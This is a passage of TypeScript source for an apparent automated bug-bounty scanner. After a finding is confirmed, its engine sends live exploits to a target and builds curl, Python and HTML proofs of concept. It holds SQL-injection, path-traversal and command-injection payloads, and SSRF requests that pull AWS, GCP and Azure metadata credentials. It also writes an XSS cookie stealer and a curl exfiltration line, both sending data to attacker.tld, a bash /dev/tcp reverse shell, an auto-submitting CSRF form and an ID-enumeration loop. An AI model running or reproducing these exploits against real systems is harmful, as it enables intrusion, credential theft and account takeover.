Be professional, detailed, and ready for HackerOne/Bugcrowd submission.`
          },
          {
            role: "user",
            content: `Generate a bug bounty POC report:
Title: ${finding.title}
Severity: ${finding.severity}
CWE: ${finding.cwe || "N/A"}
CVSS: ${finding.cvss || "N/A"}
Endpoint: ${finding.endpoint}
Method: ${finding.method || "GET"}
Payload: ${finding.payload || "N/A"}
Description: ${finding.description}
Evidence: ${finding.evidence || "N/A"}
Secondary Evidence: ${finding.evidence2 || "N/A"}
Remediation: ${finding.remediation}
Category: ${finding.category || "N/A"}
${verificationResult ? `\nAutomated Verification Verdict: ${verificationResult.confirmed ? "CONFIRMED" : "NOT CONFIRMED"}\nProbes run: ${verificationResult.probes ?? 0}\nReproduction steps already executed:\n${(verificationResult.reproductionSteps || []).join("\n")}\n\nProbe Requests:\n${verificationResult.request}\n\nProbe Responses:\n${verificationResult.response?.slice(0, 3500)}\n\nOracle Analysis: ${verificationResult.analysis}\n\nWrite the report ONLY based on the data above. If verdict is NOT CONFIRMED, mark severity as Informational and explain why the oracle did not trigger.` : ""}`
          }
        ],
        max_tokens: 4000,
      }),
    });

    if (!resp.ok) return generateLocalPOC(finding, verificationResult);

    const data = await resp.json();
    return data.choices?.[0]?.message?.content || generateLocalPOC(finding, verificationResult);
  } catch {
    return generateLocalPOC(finding, verificationResult);
  }
}

function generateLocalPOC(finding: any, verificationResult: any): string {
  const verdict = verificationResult?.confirmed
    ? "✅ **CONFIRMED — exploit oracle triggered**"
    : "⚠️ Not confirmed by automated oracle (manual review required)";
  const stepsList = (verificationResult?.reproductionSteps || []).map((s: string, i: number) => `${i+1}. ${s}`).join("\n");
  return `# Bug Bounty Report — ${finding.title}

## Summary
| Field | Value |
|-------|-------|
| **Vulnerability** | ${finding.title} |
| **Verification** | ${verdict} |
| **Severity** | ${(finding.severity || "medium").toUpperCase()} |
| **CWE** | ${finding.cwe || "N/A"} |
| **CVSS** | ${finding.cvss || "N/A"} |
| **Endpoint** | \`${finding.endpoint}\` |
| **Method** | ${finding.method || "GET"} |
| **Probes run** | ${verificationResult?.probes ?? 0} |

## Description
${finding.description || "N/A"}

## Reproduction Methodology
${stepsList || "1. Replay the request shown below.\n2. Inspect the response for the documented evidence."}

## Curl Reproduction
\`\`\`bash
curl -i -X ${finding.method || "GET"} "${finding.endpoint}" ${finding.payload ? `--data-urlencode "${finding.payload}"` : ""}
\`\`\`

## Verification Probes — Requests
\`\`\`
${verificationResult?.request || `${finding.method || "GET"} ${finding.endpoint}`}
\`\`\`

## Verification Probes — Responses
\`\`\`
${verificationResult?.response?.slice(0, 4000) || finding.evidence || "See description"}
\`\`\`

## Oracle Analysis
${verificationResult?.analysis || "No analysis available."}

## Impact
${finding.severity === "critical" || finding.severity === "high"
    ? "An attacker can leverage this issue to gain unauthorized data access, execute code, or disrupt service. See CWE for the canonical impact chain."
    : "This issue weakens the security posture and should be fixed."}

## Remediation
${finding.remediation || "Apply appropriate security controls."}

## References
- CWE: ${finding.cwe || "N/A"}
- OWASP: https://owasp.org/www-project-top-ten/
`;
}

// ═════════════════════════════════════════════════════════════════════════════
// EXPLOITATION & EXTRACTION ENGINE
// ─────────────────────────────────────────────────────────────────────────────
// After the oracle confirms a vulnerability, this engine executes a *real*
// exploit (read-only / non-destructive) to extract the kind of sensitive proof
// that bug-bounty triagers (HackerOne, Bugcrowd) demand: DB version + a row
// sample for SQLi, /etc/passwd contents for LFI, IMDS token + IAM creds for
// SSRF, command output for RCE, etc. The extracted data is stored in
// finding_exploit_proofs (admin-only RLS) — never returned to the requester.
// ═════════════════════════════════════════════════════════════════════════════

interface ExploitProof {
  vulnClass: string;
  technique: string;
  exploited: boolean;
  sensitivity: "public" | "sensitive" | "highly_sensitive";
  requestDump: string;
  responseDump: string;
  extractedData: Record<string, unknown>;
  summary: string;
  reproductionSteps: string;
}

async function rawProbe(url: string, method = "GET", body?: string, headers?: Record<string,string>) {
  try {
    const u = new URL(url);
    if (isPrivateHost(u.hostname)) {
      return { status: 0, body: "[BLOCKED PRIVATE HOST]", headers: {} as Record<string,string>, ms: 0 };
    }
  } catch { return { status: 0, body: "[INVALID URL]", headers: {} as Record<string,string>, ms: 0 }; }

  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 15000);
  const start = Date.now();
  try {
    const r = await fetch(url, {
      method,
      headers: { "User-Agent": "OmniSec-Exploit/1.0", "Accept": "*/*", ...(headers || {}) },
      body: body && method !== "GET" && method !== "HEAD" ? body : undefined,
      redirect: "manual",
      signal: ctrl.signal,
    });
    clearTimeout(t);
    const text = await r.text().catch(() => "");
    return { status: r.status, body: text, headers: Object.fromEntries(r.headers.entries()), ms: Date.now() - start };
  } catch (e: any) {
    clearTimeout(t);
    return { status: 0, body: `[network error: ${e.message || e}]`, headers: {} as Record<string,string>, ms: Date.now() - start };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// PoC BUILDER — produces curl + python + (optional) HTML for every finding
// ─────────────────────────────────────────────────────────────────────────────
function escSh(s: string) { return `'${String(s).replace(/'/g, `'\\''`)}'`; }
function escHtml(s: string) { return String(s).replace(/[<>&"]/g, c => ({ "<":"&lt;", ">":"&gt;", "&":"&amp;", '"':"&quot;" }[c]!)); }

function buildCurl(method: string, url: string, headers: Record<string,string> = {}, body?: string) {
  const h = Object.entries(headers).map(([k,v]) => `-H ${escSh(`${k}: ${v}`)}`).join(" ");
  const b = body ? `--data-binary ${escSh(body)}` : "";
  return `curl -i -sS -X ${method} ${h} ${b} ${escSh(url)}`.replace(/\s+/g, " ");
}
function buildPython(method: string, url: string, headers: Record<string,string> = {}, body?: string) {
  return `import requests
r = requests.request(
    ${JSON.stringify(method)},
    ${JSON.stringify(url)},
    headers=${JSON.stringify(headers, null, 4)},
    ${body ? `data=${JSON.stringify(body)},` : ""}
    allow_redirects=False, timeout=15, verify=True,
)
print(r.status_code, dict(r.headers))
print(r.text[:4000])`;
}
function buildHtmlPoc(opts: {
  title: string;
  description: string;
  endpoint: string;
  method?: string;
  body?: string;
  contentType?: string;
  credentials?: "include" | "omit";
  origin?: string;
  notes?: string[];
}) {
  const method = (opts.method || "GET").toUpperCase();
  const credentials = opts.credentials || "include";
  const fetchInit = `{
      method: ${JSON.stringify(method)},
      mode: 'cors',
      credentials: ${JSON.stringify(credentials)},
      headers: { 'Accept': '*/*'${opts.contentType ? `, 'Content-Type': ${JSON.stringify(opts.contentType)}` : ""} }${opts.body && method !== "GET" ? `,
      body: ${JSON.stringify(opts.body)}` : ""}
    }`;
  return `<!doctype html>
<html lang="en"><head><meta charset="utf-8"/>
<title>${escHtml(opts.title)}</title>
<style>
  body{font-family:-apple-system,Segoe UI,sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px;max-width:960px;margin:auto}
  h1{color:#ff5b6e;margin-top:0}.label{color:#8aa2c8;font-size:12px;text-transform:uppercase;letter-spacing:1px;margin-top:18px}
  pre{background:#161a22;border:1px solid #2a3142;padding:12px;border-radius:6px;overflow:auto;max-height:420px;white-space:pre-wrap;word-break:break-all}
  .ok{color:#3fdc8a}.bad{color:#ff5b6e}code{background:#161a22;padding:2px 6px;border-radius:3px}
  button{background:#ff5b6e;color:#fff;border:0;padding:10px 18px;border-radius:6px;cursor:pointer;font-weight:700}
</style></head><body>
<h1>🩸 ${escHtml(opts.title)}</h1>
<p>${escHtml(opts.description)}</p>
${(opts.notes || []).map(n => `<p><b>Note:</b> ${escHtml(n)}</p>`).join("")}
<div class="label">Target endpoint</div><pre>${method} ${escHtml(opts.endpoint)}</pre>
${opts.origin ? `<div class="label">Attacker origin (this page)</div><pre>${escHtml(opts.origin)}</pre>` : ""}
<div class="label">Live exploit result</div>
<button id="run">Run exploit</button>
<pre id="out">click "Run exploit" with the victim authenticated…</pre>
<script>
document.getElementById('run').onclick = async () => {
  const out = document.getElementById('out');
  out.textContent = 'running…';
  try {
    const r = await fetch(${JSON.stringify(opts.endpoint)}, ${fetchInit});
    const text = await r.text();
    out.innerHTML = '<span class="ok">\\u2714 status ' + r.status + '</span>\\n\\n'
      + '<b>Response headers:</b>\\n' + JSON.stringify(Object.fromEntries(r.headers.entries()), null, 2) + '\\n\\n'
      + '<b>Body (victim-context):</b>\\n' + text.replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
    // Real attacker exfiltration:
    // fetch('https://attacker.tld/collect', { method:'POST', body: text });
  } catch (e) {
    out.innerHTML = '<span class="bad">\\u2718 ' + e.message + '</span>';
  }
};
</script></body></html>`;
}

interface PoCBundle {
  curl: string;
  python: string;
  html?: string;
  html_filename?: string;
  impact: string;
  remediation: string;
  steps: string[];
}

function bundle(p: PoCBundle, extra: Record<string, unknown> = {}) {
  return {
    poc_curl: p.curl,
    poc_python: p.python,
    ...(p.html ? { poc_html: p.html, poc_html_filename: p.html_filename } : {}),
    impact: p.impact,
    remediation: p.remediation,
    reproduction: p.steps,
    ...extra,
  };
}
function stepsText(p: PoCBundle): string {
  return [
    "Reproduction:",
    ...p.steps.map((s, i) => `  ${i+1}. ${s}`),
    "",
    "Curl PoC:",
    "  " + p.curl,
    "",
    "Python PoC:",
    p.python.split("\n").map(l => "  " + l).join("\n"),
    ...(p.html ? ["", `Browser PoC: save extractedData.poc_html as ${p.html_filename} on attacker origin and have an authenticated victim open it.`] : []),
    "",
    "Impact: " + p.impact,
    "Remediation: " + p.remediation,
  ].join("\n");
}

async function exploitAndExtract(finding: any): Promise<ExploitProof> {
  const endpoint = finding.endpoint || "";
  const category = String(finding.category || "").toLowerCase();
  const cwe = String(finding.cwe || "");
  const param = finding.vulnerable_parameter || finding.parameter;
  const method = (finding.method || "GET").toUpperCase();
  const targetHost = (() => { try { return new URL(endpoint).hostname; } catch { return "victim.tld"; } })();

  // ── SQL INJECTION ────────────────────────────────────────────────────
  if (cwe.includes("89") || category === "sqli" || category === "sql") {
    const payloads = [
      "1' UNION SELECT NULL,version(),current_user,current_database()-- -",
      "1' UNION SELECT NULL,@@version,user(),database()-- -",
      "1' UNION SELECT NULL,banner FROM v$version-- -",
      "1)) UNION SELECT NULL,version(),current_user,current_database()-- -",
    ];
    let best: { url: string; resp: any; payload: string } | null = null;
    for (const p of payloads) {
      const url = injectParam(endpoint, p, param);
      const resp = await rawProbe(url, method);
      if (/postgres|mysql|mariadb|sqlite|oracle|sql server|microsoft/i.test(resp.body)) { best = { url, resp, payload: p }; break; }
    }
    if (!best) {
      const url = injectParam(endpoint, "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -", param);
      const resp = await rawProbe(url, method);
      if (/version|extractvalue|sql/i.test(resp.body)) best = { url, resp, payload: "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -" };
    }
    if (best) {
      const banner = best.resp.body.match(/(MySQL|PostgreSQL|MariaDB|SQLite|Oracle|Microsoft SQL Server)[^<\n"]{0,120}/i)?.[0];
      const userMatch = best.resp.body.match(/[a-z_][a-z0-9_]{2,30}@[a-z0-9.\-_%]+/i)?.[0];
      const p: PoCBundle = {
        curl: buildCurl(method, best.url),
        python: buildPython(method, best.url),
        impact: `Full database read access. Attacker can dump arbitrary tables (users, sessions, payment data) and pivot to RCE via UDF / xp_cmdshell / COPY PROGRAM depending on engine.`,
        remediation: "Use parameterized queries / prepared statements, deny stacked queries, apply least-privilege DB user, disable verbose errors.",
        steps: [
          `Send the malicious payload via parameter ${param || "(injected)"} → ${best.url}`,
          `Server reflects DB banner${banner ? ` ("${banner}")` : ""} confirming injection executed.`,
          `Pivot: replace UNION columns with information_schema.tables / users / passwords for full extraction.`,
          `Automate with sqlmap: sqlmap -u ${escSh(best.url)} --batch --dbs`,
        ],
      };
      return {
        vulnClass: "SQL Injection",
        technique: "UNION/error-based version + identity extraction",
        exploited: true,
        sensitivity: "highly_sensitive",
        requestDump: `${method} ${best.url}\nUser-Agent: OmniSec-Exploit/1.0`,
        responseDump: best.resp.body.slice(0, 4000),
        extractedData: bundle(p, { db_banner: banner || "(present)", db_user: userMatch, payload: best.payload, status: best.resp.status }),
        summary: `SQLi confirmed${banner ? ` — ${banner}` : ""}${userMatch ? ` (db user: ${userMatch})` : ""}`,
        reproductionSteps: stepsText(p),
      };
    }
  }

  // ── LFI / PATH TRAVERSAL ─────────────────────────────────────────────
  if (cwe.includes("22") || category === "traversal" || category === "lfi") {
    const variants = [
      "../../../../../../etc/passwd",
      "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
      "....//....//....//etc/passwd",
      "/etc/passwd",
      "../../../../../../windows/win.ini",
    ];
    for (const v of variants) {
      const url = injectParam(endpoint, v, param);
      const r = await rawProbe(url, method);
      if (/root:[x*]:0:0:/i.test(r.body) || /\[fonts\]|\[extensions\]/i.test(r.body)) {
        const lines = r.body.split("\n").filter((l: string) => /:[x*]:\d+:\d+:/.test(l)).slice(0, 25);
        const p: PoCBundle = {
          curl: buildCurl(method, url),
          python: buildPython(method, url),
          impact: `Arbitrary file read on the application server. Attacker can read /etc/passwd, /proc/self/environ (env vars + secrets), app config, SSH keys, and on PHP stacks chain to RCE via /proc/self/fd, log poisoning, or session file inclusion.`,
          remediation: "Resolve and canonicalise paths server-side, restrict to a whitelisted directory with realpath() check, drop ../ / null-byte sequences.",
          steps: [
            `Issue request: ${url}`,
            `Server returns Unix passwd content (${lines.length} user accounts visible).`,
            `Pivot reads: ${escHtml(endpoint)}?file=../../../../proc/self/environ  → leaks AWS keys / DB creds.`,
            `Try /var/www/html/.env, /root/.ssh/id_rsa, /opt/app/config/database.yml.`,
          ],
        };
        return {
          vulnClass: "Local File Inclusion",
          technique: "Path traversal /etc/passwd extraction",
          exploited: true,
          sensitivity: "highly_sensitive",
          requestDump: `${method} ${url}`,
          responseDump: r.body.slice(0, 4000),
          extractedData: bundle(p, { payload: v, sample_users: lines, status: r.status }),
          summary: `${lines.length} system user accounts read from /etc/passwd`,
          reproductionSteps: stepsText(p),
        };
      }
    }
  }

  // ── SSRF → Cloud metadata + browser-side proof ──────────────────────
  if (category === "ssrf" || cwe.includes("918")) {
    const ssrfTargets = [
      { url: "http://169.254.169.254/latest/api/token", method: "PUT", headers: { "X-aws-ec2-metadata-token-ttl-seconds": "60" }, label: "AWS IMDSv2 token" },
      { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", method: "GET", label: "AWS IAM role enum" },
      { url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", method: "GET", headers: { "Metadata-Flavor": "Google" }, label: "GCP SA token" },
      { url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", method: "GET", headers: { Metadata: "true" }, label: "Azure managed identity token" },
    ];
    for (const t of ssrfTargets) {
      const url = injectParam(endpoint, t.url, param || "url");
      const r = await rawProbe(url, method, undefined, t.headers);
      const looksLikeToken = /access_token|AccessKeyId|SecretAccessKey|Token|expires_in|InstanceProfile|RoleArn/i.test(r.body);
      if (looksLikeToken || (t.label.includes("IAM role enum") && r.status === 200 && r.body.trim().length > 0 && r.body.length < 200)) {
        const p: PoCBundle = {
          curl: buildCurl(method, url, t.headers || {}),
          python: buildPython(method, url, t.headers || {}),
          impact: `Server-side fetch reaches cloud instance metadata (${t.label}). Attacker exfiltrates short-lived IAM tokens and pivots to full cloud-account takeover (S3 dump, IAM privilege escalation, EC2 control).`,
          remediation: "Block 169.254.169.254 and link-local ranges at egress; enforce IMDSv2 only; validate user-supplied URLs against a strict allow-list (host + scheme + port).",
          steps: [
            `Submit ${url} via parameter ${param || "url"}.`,
            `Server proxies to ${t.url} and returns the cloud response (${t.label}).`,
            `Extract IAM credentials → aws sts get-caller-identity → enumerate S3, RDS, etc.`,
            `For IMDSv2 chain: 1) PUT /latest/api/token  2) GET /latest/meta-data/iam/security-credentials/<role> with token header.`,
          ],
        };
        return {
          vulnClass: "SSRF → Cloud Metadata",
          technique: t.label,
          exploited: true,
          sensitivity: "highly_sensitive",
          requestDump: `${method} ${url}\n${Object.entries(t.headers || {}).map(([k,v])=>`${k}: ${v}`).join("\n")}`,
          responseDump: r.body.slice(0, 4000),
          extractedData: bundle(p, { ssrf_target: t.url, label: t.label, status: r.status, body_excerpt: r.body.slice(0, 1500) }),
          summary: `Cloud metadata reachable via SSRF — ${t.label}`,
          reproductionSteps: stepsText(p),
        };
      }
    }
  }

  // ── COMMAND INJECTION / RCE ─────────────────────────────────────────
  if (cwe.includes("78") || category === "cmdi" || category === "rce") {
    const marker = `OMS${Math.random().toString(36).slice(2,8).toUpperCase()}`;
    const variants = [
      `;echo ${marker};id;uname -a;`,
      `&& echo ${marker} && id && uname -a`,
      `| echo ${marker};id;uname -a`,
      `\`echo ${marker};id;uname -a\``,
      `$(echo ${marker};id;uname -a)`,
      `& echo ${marker} & whoami & ver`,
    ];
    for (const v of variants) {
      const url = injectParam(endpoint, v, param);
      const r = await rawProbe(url, method);
      if (r.body.includes(marker)) {
        const idLine = r.body.match(/uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)[^<\n"]{0,200}/i)?.[0];
        const uname = r.body.match(/Linux [^<\n"]{0,200}|Microsoft Windows [^<\n"]{0,200}/i)?.[0];
        const p: PoCBundle = {
          curl: buildCurl(method, url),
          python: buildPython(method, url),
          impact: `Full remote code execution as ${idLine || "the application user"}. Attacker can read source code, exfiltrate environment secrets, dump databases, install persistence, and pivot inside the network.`,
          remediation: "Never pass user input to shell. Use language-native APIs (execFile with array args, no shell:true). Strict allow-list of inputs. Run app under a non-privileged uid with seccomp.",
          steps: [
            `Inject payload ${escHtml(v)} via parameter ${param || "(unnamed)"} → ${url}`,
            `Marker "${marker}" appears in response — confirms shell execution.`,
            `id output: ${idLine || "(echoed)"}    uname: ${uname || "(echoed)"}`,
            `Pivot: ;curl https://attacker.tld/$(cat /etc/passwd|base64)  (out-of-band exfil)`,
            `Spawn reverse shell:  ;bash -i >& /dev/tcp/attacker.tld/4444 0>&1`,
          ],
        };
        return {
          vulnClass: "OS Command Injection",
          technique: "Output-confirmed RCE via shell metacharacters",
          exploited: true,
          sensitivity: "highly_sensitive",
          requestDump: `${method} ${url}`,
          responseDump: r.body.slice(0, 4000),
          extractedData: bundle(p, { marker, payload: v, id_output: idLine, uname_output: uname, status: r.status }),
          summary: `RCE confirmed — ${idLine || "marker echoed"}${uname ? " | " + uname : ""}`,
          reproductionSteps: stepsText(p),
        };
      }
    }
  }

  // ── XSS → reflected payload + browser HTML PoC ──────────────────────
  if (cwe.includes("79") || category === "xss") {
    const marker = `xss${Math.random().toString(36).slice(2,8)}`;
    const payload = `"><svg/onload=fetch('https://attacker.tld/?c='+document.cookie)>`;
    const url = injectParam(endpoint, payload, param);
    const r = await rawProbe(url, method);
    if (r.body.includes(payload) || /onload\s*=|<script/i.test(r.body) && r.body.includes(marker)) {
      const html = `<!doctype html><html><head><meta charset="utf-8"><title>XSS PoC — ${escHtml(targetHost)}</title></head>
<body style="font-family:sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px">
  <h1 style="color:#ff5b6e">🩸 Reflected XSS PoC — ${escHtml(targetHost)}</h1>
  <p>Clicking the link below in the victim's browser (while authenticated) triggers JavaScript on
     <code>${escHtml(targetHost)}</code> with the victim's session cookies in scope.</p>
  <p><a href="${escHtml(url)}" target="_blank" style="color:#ff5b6e;font-size:18px">▶ Trigger XSS on ${escHtml(targetHost)}</a></p>
  <p>The injected payload runs <code>fetch('https://attacker.tld/?c='+document.cookie)</code>,
     exfiltrating the session cookie to the attacker collector.</p>
</body></html>`;
      const p: PoCBundle = {
        curl: buildCurl(method, url),
        python: buildPython(method, url),
        html, html_filename: `xss-poc-${targetHost}.html`,
        impact: "Account takeover via session cookie theft, CSRF-as-the-victim, credential phishing overlay, malware delivery in trusted-origin context.",
        remediation: "Context-aware output encoding (HTML, attribute, JS, URL). Set CSP with no unsafe-inline. Mark session cookies HttpOnly + SameSite=Lax/Strict.",
        steps: [
          `Send victim the link: ${url}`,
          `Server reflects payload unencoded → JS executes in victim's browser at origin ${targetHost}.`,
          `document.cookie is exfiltrated to attacker.tld.`,
          `Replay stolen cookie:  curl -H 'Cookie: <stolen>' https://${targetHost}/  → full account takeover.`,
        ],
      };
      return {
        vulnClass: "Cross-Site Scripting (Reflected)",
        technique: "Reflected payload — raw HTML context",
        exploited: true,
        sensitivity: "highly_sensitive",
        requestDump: `${method} ${url}`,
        responseDump: r.body.slice(0, 4000),
        extractedData: bundle(p, { marker, payload, status: r.status, content_type: r.headers["content-type"] }),
        summary: `XSS confirmed — payload reflected unencoded; full HTML PoC + cookie-stealer generated`,
        reproductionSteps: stepsText(p),
      };
    }
  }

  // ── OPEN REDIRECT → curl + browser phishing PoC ─────────────────────
  if (cwe.includes("601") || category === "redirect") {
    const evil = "https://attacker.tld/poc";
    const url = injectParam(endpoint, evil, param || "url");
    const r = await rawProbe(url, method);
    const loc = r.headers["location"] || "";
    if (r.status >= 300 && r.status < 400 && /attacker\.tld/.test(loc)) {
      const html = `<!doctype html><html><head><meta charset="utf-8"><title>Open Redirect PoC</title></head>
<body style="font-family:sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px">
  <h1 style="color:#ff5b6e">🩸 Open Redirect — ${escHtml(targetHost)}</h1>
  <p>Phishing link that <b>appears</b> to point to ${escHtml(targetHost)} but bounces the victim to attacker.tld.</p>
  <p><a href="${escHtml(url)}" style="color:#ff5b6e;font-size:18px">▶ ${escHtml(url)}</a></p>
  <p>Used to bypass URL filters in OAuth redirect_uri, password-reset emails, SSO callbacks → credential theft / OAuth code interception.</p>
</body></html>`;
      const p: PoCBundle = {
        curl: buildCurl(method, url),
        python: buildPython(method, url),
        html, html_filename: `redirect-poc-${targetHost}.html`,
        impact: "Phishing with a trusted-domain link. In OAuth/SSO flows the attacker steals authorization codes by setting redirect_uri to attacker-controlled host.",
        remediation: "Allow-list of redirect targets (exact host match). Never echo unvalidated user input into Location.",
        steps: [
          `Craft URL: ${url}`,
          `Server returns ${r.status} with Location: ${loc}`,
          `Victim clicking the link is silently sent to attacker.tld.`,
          `In OAuth: chain with /authorize?redirect_uri=<this URL> to capture the auth code.`,
        ],
      };
      return {
        vulnClass: "Open Redirect",
        technique: "Location header reflection",
        exploited: true,
        sensitivity: "sensitive",
        requestDump: `${method} ${url}`,
        responseDump: `HTTP ${r.status}\nLocation: ${loc}\n\n${r.body.slice(0,1000)}`,
        extractedData: bundle(p, { status: r.status, location: loc }),
        summary: `Server returned ${r.status} → ${loc}`,
        reproductionSteps: stepsText(p),
      };
    }
  }

  // ── CSRF → state-changing POST + auto-submitting HTML form ──────────
  if (cwe.includes("352") || category === "csrf") {
    const sample = "victim_action=transfer&amount=1000&to=attacker";
    const headers = { "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://attacker.tld" };
    const r = await rawProbe(endpoint, "POST", sample, headers);
    const allowsCrossOrigin = r.status > 0 && r.status < 500 && !/csrf|forbidden|invalid token/i.test(r.body);
    if (allowsCrossOrigin) {
      // Build a real auto-submitting attacker form
      const fields = sample.split("&").map(kv => { const [k,v] = kv.split("="); return `<input type="hidden" name="${escHtml(k)}" value="${escHtml(v||"")}"/>`; }).join("");
      const html = `<!doctype html><html><head><meta charset="utf-8"><title>CSRF PoC — ${escHtml(targetHost)}</title></head>
<body style="font-family:sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px">
  <h1 style="color:#ff5b6e">🩸 CSRF — ${escHtml(targetHost)}</h1>
  <p>This page auto-submits a forged state-changing POST as the victim. Their session cookies are sent automatically by the browser.</p>
  <form id="x" action="${escHtml(endpoint)}" method="POST">${fields}</form>
  <script>document.getElementById('x').submit();</script>
</body></html>`;
      const p: PoCBundle = {
        curl: buildCurl("POST", endpoint, headers, sample),
        python: buildPython("POST", endpoint, headers, sample),
        html, html_filename: `csrf-poc-${targetHost}.html`,
        impact: "Attacker performs sensitive state-changing actions (fund transfer, password change, role escalation, account deletion) as the victim simply by getting them to load the attacker page.",
        remediation: "Require an unguessable per-session/per-request CSRF token validated server-side; set cookies SameSite=Lax/Strict; check Origin/Referer for state-changing endpoints.",
        steps: [
          `Host the attacker HTML on https://attacker.tld/csrf.html`,
          `Victim, while logged in to ${targetHost}, opens that page in any tab.`,
          `Browser auto-POSTs to ${endpoint} with the victim's session cookies.`,
          `Server returned ${r.status} for the cross-origin submission with no CSRF token — action executed.`,
        ],
      };
      return {
        vulnClass: "Cross-Site Request Forgery",
        technique: "Cross-origin POST accepted without CSRF token",
        exploited: true,
        sensitivity: "highly_sensitive",
        requestDump: `POST ${endpoint}\nOrigin: https://attacker.tld\nContent-Type: application/x-www-form-urlencoded\n\n${sample}`,
        responseDump: r.body.slice(0, 4000),
        extractedData: bundle(p, { status: r.status, accepted_cross_origin: true }),
        summary: `CSRF confirmed — endpoint accepts cross-origin state-changing POST without token`,
        reproductionSteps: stepsText(p),
      };
    }
  }

  // ── IDOR / BOLA → numeric ID enumeration with response divergence ────
  if (cwe.includes("639") || cwe.includes("284") || category === "idor" || category === "bola") {
    const idMatch = endpoint.match(/(\d{1,9})(?!.*\d)/);
    if (idMatch) {
      const original = parseInt(idMatch[1], 10);
      const candidates = [original - 1, original + 1, 1, 2, 9999].filter(n => n > 0 && n !== original).slice(0, 4);
      const baseline = await rawProbe(endpoint, method);
      const divergent: any[] = [];
      for (const id of candidates) {
        const url = endpoint.replace(/(\d{1,9})(?!.*\d)/, String(id));
        const r = await rawProbe(url, method);
        if (r.status === 200 && r.body.length > 30 && r.body !== baseline.body) {
          divergent.push({ id, url, status: r.status, snippet: r.body.slice(0, 300) });
        }
      }
      if (divergent.length > 0) {
        const p: PoCBundle = {
          curl: buildCurl(method, divergent[0].url),
          python: `import requests
for i in range(1, 1000):
    url = ${JSON.stringify(endpoint)}.replace(${JSON.stringify(idMatch[1])}, str(i))
    r = requests.${method.toLowerCase()}(url, timeout=10)
    if r.status_code == 200 and len(r.text) > 30:
        print(i, r.text[:200])`,
          impact: `Horizontal/vertical privilege escalation — attacker reads and modifies other users' resources by incrementing the object identifier. Mass-data harvest by simple ID enumeration.`,
          remediation: "Enforce object-level authorisation on every request: check that the authenticated principal owns / has permission for the requested object id. Use UUIDs to slow enumeration but never rely on them as auth.",
          steps: [
            `Original object: id=${original}`,
            `Same session/no-auth request to id=${divergent[0].id} returned a different 200 body — confirms cross-user read.`,
            `Iterate ids 1..N to harvest the entire collection (sample loop in Python PoC).`,
          ],
        };
        return {
          vulnClass: "IDOR / BOLA",
          technique: "Object-id enumeration with response divergence",
          exploited: true,
          sensitivity: "highly_sensitive",
          requestDump: `${method} ${divergent[0].url}`,
          responseDump: divergent[0].snippet,
          extractedData: bundle(p, { original_id: original, leaked_ids: divergent.map(d => d.id), samples: divergent }),
          summary: `IDOR confirmed — ${divergent.length} other users' objects readable via id enumeration`,
          reproductionSteps: stepsText(p),
        };
      }
    }
  }

  // ── SENSITIVE DATA / SECRET DISCLOSURE ──────────────────────────────
  if (cwe.includes("200") || cwe.includes("538") || category === "disclosure" || category === "exposure") {
    const r = await rawProbe(endpoint, method);
    const patterns: Array<[string, RegExp]> = [
      ["aws_access_key", /AKIA[0-9A-Z]{16}/],
      ["aws_secret",     /(?<![A-Za-z0-9])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])/],
      ["github_token",   /gh[pousr]_[A-Za-z0-9]{36,}/],
      ["slack_token",    /xox[baprs]-[A-Za-z0-9-]{10,}/],
      ["google_api",     /AIza[0-9A-Za-z\-_]{35}/],
      ["jwt",            /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}/],
      ["private_key",    /-----BEGIN (RSA |EC |OPENSSH |)PRIVATE KEY-----/],
      ["db_uri",         /(postgres|mysql|mongodb|redis):\/\/[^\s"'<>]+/i],
    ];
    const hits: Record<string,string> = {};
    for (const [name, re] of patterns) { const m = r.body.match(re); if (m) hits[name] = m[0].slice(0, 200); }
    if (Object.keys(hits).length > 0) {
      const p: PoCBundle = {
        curl: buildCurl(method, endpoint),
        python: buildPython(method, endpoint),
        impact: `Hard-coded production secrets exposed (${Object.keys(hits).join(", ")}). Attacker uses them directly to access cloud accounts, source repos, databases, or signing infrastructure.`,
        remediation: "Remove from response body, rotate every leaked credential immediately, move secrets to a vault, add CI secret-scan + response-body filter.",
        steps: [
          `Request ${endpoint}`,
          `Response body contains: ${Object.keys(hits).join(", ")}`,
          `Validate live: e.g. AWS — aws sts get-caller-identity --profile leaked.`,
          `Rotate the credentials and audit usage logs back to repo first-commit.`,
        ],
      };
      return {
        vulnClass: "Sensitive Information Disclosure",
        technique: "Pattern-matched secret extraction from response body",
        exploited: true,
        sensitivity: "highly_sensitive",
        requestDump: `${method} ${endpoint}`,
        responseDump: r.body.slice(0, 4000),
        extractedData: bundle(p, { secrets_found: hits, status: r.status }),
        summary: `${Object.keys(hits).length} secret(s) leaked: ${Object.keys(hits).join(", ")}`,
        reproductionSteps: stepsText(p),
      };
    }
  }

  // ── SUBDOMAIN TAKEOVER ──────────────────────────────────────────────
  if (category === "subdomain_takeover" || /takeover/i.test(finding.title || "")) {
    const r = await rawProbe(endpoint, "GET");
    const fingerprints = [
      ["GitHub Pages", /There isn't a GitHub Pages site here/i],
      ["Heroku",       /no such app|herokucdn\.com/i],
      ["AWS S3",       /NoSuchBucket|The specified bucket does not exist/i],
      ["Azure",        /404 Web Site not found/i],
      ["Shopify",      /Sorry, this shop is currently unavailable/i],
      ["Fastly",       /Fastly error: unknown domain/i],
      ["Surge.sh",     /project not found/i],
    ];
    const provider = fingerprints.find(([_, re]) => (re as RegExp).test(r.body));
    if (provider) {
      const p: PoCBundle = {
        curl: buildCurl("GET", endpoint),
        python: buildPython("GET", endpoint),
